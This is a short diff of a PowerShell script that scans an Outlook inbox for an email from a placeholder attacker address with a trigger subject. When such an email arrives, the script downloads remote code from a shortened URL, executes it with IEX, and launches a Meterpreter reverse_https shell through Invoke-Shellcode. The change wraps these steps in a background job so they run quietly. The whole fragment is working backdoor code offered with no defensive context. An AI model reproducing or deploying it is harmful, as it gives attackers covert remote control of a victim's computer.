@@ -6,10 +6,9 @@ $inbox = $ns.GetDefaultFolder($olFolderInbox)
 $Emails = $inbox.items
 $Emails | foreach { 
 if($_.SenderEmailAddress -match "ATTACKEREMAIL@EMAIL.COM" -and $_.subject -match "TRIGGERTEXT")
-{$WebClientObject = New-Object Net.WebClient
+{Start-Job -ScriptBlock {$WebClientObject = New-Object Net.WebClient
 IEX $WebClientObject.DownloadString('http://goo.gl/yfLfQB')
-Invoke-Shellcode -Payload windows/meterpreter/reverse_https -LHOST xxx.xxx.x.xxx -LPORT 1111 -Force
-Return
+Invoke-Shellcode -Payload windows/meterpreter/reverse_https -LHOST xxx.xxx.x.xxx -LPORT 1111 -Force}
 
 }}
 $Emails | foreach { 
